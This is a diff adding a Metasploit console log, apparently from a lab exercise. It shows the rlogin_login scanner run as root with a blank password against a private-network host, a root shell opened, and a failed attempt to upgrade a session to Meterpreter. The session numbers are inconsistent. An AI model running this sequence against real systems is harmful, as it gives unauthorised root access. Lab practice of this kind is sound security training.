@@ -1,0 +1,70 @@
+
+
+msf6 auxiliary(scanner/rservices/rlogin_login) > show options 
+
+Module options (auxiliary/scanner/rservices/rlogin_login):
+
+   Name              Current Setting                                                          Required  Description
+   ----              ---------------                                                          --------  -----------
+   BLANK_PASSWORDS   false                                                                    no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                        yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                                                    no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                    no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                    no        Add all users in the current database to the list
+   DB_SKIP_EXISTING  none                                                                     no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
+   FROMUSER                                                                                   no        The username to login from
+   FROMUSER_FILE     /usr/share/metasploit-framework/data/wordlists/rservices_from_users.txt  no        File containing from usernames, one per line
+   PASSWORD                                                                                   no        A specific password to authenticate with
+   PASS_FILE                                                                                  no        File containing passwords, one per line
+   RHOSTS                                                                                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT             513                                                                      yes       The target port (TCP)
+   SPEED             9600                                                                     yes       The terminal speed desired
+   STOP_ON_SUCCESS   false                                                                    yes       Stop guessing when a credential works for a host
+   TERM              vt100                                                                    yes       The terminal type desired
+   THREADS           1                                                                        yes       The number of concurrent threads (max one per host)
+   USERNAME                                                                                   no        A specific username to authenticate as
+   USERPASS_FILE                                                                              no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                                                                    no        Try the username as the password for all users
+   USER_FILE                                                                                  no        File containing usernames, one per line
+   VERBOSE           true                                                                     yes       Whether to print output for all attempts
+
+msf6 auxiliary(scanner/rservices/rlogin_login) > dir
+[*] exec: dir
+
+Notes.txt  password  Username
+msf6 auxiliary(scanner/rservices/rlogin_login) > 
+msf6 auxiliary(scanner/rservices/rlogin_login) > set RHOSTS 192.168.1.38
+RHOSTS => 192.168.1.38
+msf6 auxiliary(scanner/rservices/rlogin_login) > set UsERnAME root
+UsERnAME => root
+msf6 auxiliary(scanner/rservices/rlogin_login) > exploit 
+
+[*] 192.168.1.38:513      - 192.168.1.38:513 - Starting rlogin sweep
+[*] 192.168.1.38:513      - 192.168.1.38:513 rlogin - Attempting: 'root':"" from 'root'
+[+] 192.168.1.38:513      - 192.168.1.38:513, rlogin 'root' from 'root' with no password.
+[!] 192.168.1.38:513      - *** auxiliary/scanner/rservices/rlogin_login is still calling the deprecated report_auth_info method! This needs to be updated!
+[!] 192.168.1.38:513      - *** For detailed information about LoginScanners and the Credentials objects see:
+[!] 192.168.1.38:513      -      https://github.com/rapid7/metasploit-framework/wiki/Creating-Metasploit-Framework-LoginScanners
+[!] 192.168.1.38:513      -      https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-HTTP-LoginScanner-Module
+[!] 192.168.1.38:513      - *** For examples of modules converted to just report credentials without report_auth_info, see:
+[!] 192.168.1.38:513      -      https://github.com/rapid7/metasploit-framework/pull/5376
+[!] 192.168.1.38:513      -      https://github.com/rapid7/metasploit-framework/pull/5377
+[*] Command shell session 6 opened (0.0.0.0:1023 -> 192.168.1.38:513 ) at 2021-12-19 01:03:07 -0500
+[*] 192.168.1.38:513      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/rservices/rlogin_login) > sessions 
+
+
+
+=======================================
+
+msf6 auxiliary(scanner/rservices/rlogin_login) > sessions -u 8
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [8]
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: 
+[*] Upgrading session ID: 8
+id
+ls
+[-] Shells on the target platform, , cannot be upgraded to Meterpreter at this time.
+
